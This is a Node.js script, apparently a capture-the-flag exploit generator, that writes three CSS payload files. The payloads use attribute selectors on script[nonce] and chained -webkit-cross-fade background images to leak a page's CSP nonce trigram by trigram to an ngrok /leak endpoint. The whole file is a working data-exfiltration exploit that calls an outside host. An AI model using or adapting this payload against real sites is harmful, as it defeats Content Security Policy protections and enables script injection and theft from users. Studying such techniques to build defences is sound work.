const fs = require("fs");
let chars = "abcdefghijklmnopqrstuvwxyz0123456789";
const host = "https://raptor-tolerant-stag.ngrok-free.app";

let arr = [];
for (let a of chars) {
  for (let b of chars) {
    for (let c of chars) {
      let str = a + b + c;
      arr.push(str);
    }
  }
}

let payload1 = "";
let crossPayload1 = 'url("/")';
let payload2 = "";
let crossPayload2 = 'url("/")';
let payload3 = "";
let crossPayload3 = 'url("/")';

const third = Math.floor(arr.length / 3);
const arr1 = arr.slice(0, third);
const arr2 = arr.slice(third, third * 2);
const arr3 = arr.slice(third * 2);

for (let str of arr1) {
  payload1 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`;
  crossPayload1 = `-webkit-cross-fade(${crossPayload1}, var(--${str},none), 50%)`;
}
for (let str of arr2) {
  payload2 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`;
  crossPayload2 = `-webkit-cross-fade(${crossPayload2}, var(--${str}, none), 50%)`;
}
for (let str of arr3) {
  payload3 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`;
  crossPayload3 = `-webkit-cross-fade(${crossPayload3}, var(--${str}, none), 50%)`;
}
payload1 = `${payload1} script{display:block;} script{background-image: ${crossPayload1}}`;
payload2 = `${payload2}script:after{content:'a';display:block;background-image:${crossPayload2} }`;
payload3 = `${payload3}script:before{content:'a';display:block;background-image:${crossPayload3} }`;

fs.writeFileSync("exp1.css", payload1, "utf-8");
fs.writeFileSync("exp2.css", payload2, "utf-8");
fs.writeFileSync("exp3.css", payload3, "utf-8");
